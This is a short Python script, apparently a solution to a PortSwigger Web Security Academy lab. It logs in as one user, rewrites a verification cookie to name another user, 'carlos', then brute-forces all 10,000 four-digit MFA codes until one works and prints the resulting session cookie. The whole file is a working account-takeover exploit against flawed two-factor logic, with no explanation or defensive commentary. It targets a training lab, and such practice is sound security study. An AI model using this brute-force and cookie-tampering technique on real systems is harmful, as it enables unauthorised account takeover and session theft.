import requests


url = "https://0aa800d703741cf680d9b884009d008a.web-security-academy.net/"
creds = {"username":"wiener", "password":"peter"}
target = "carlos"

s = requests.session()

s.get(url+"login")
s.post(url+"login", data=creds)

s.cookies["verify"]=target

for i in range(0, 10000):
    print(i)
    r=s.post(url+"login2", data={"mfa-code":str(i).rjust(4, '0')}).text
    if("Incorrect security code" not in r):
        print("Logged in")
        print(i)
        print(s.cookies["session"])
        break


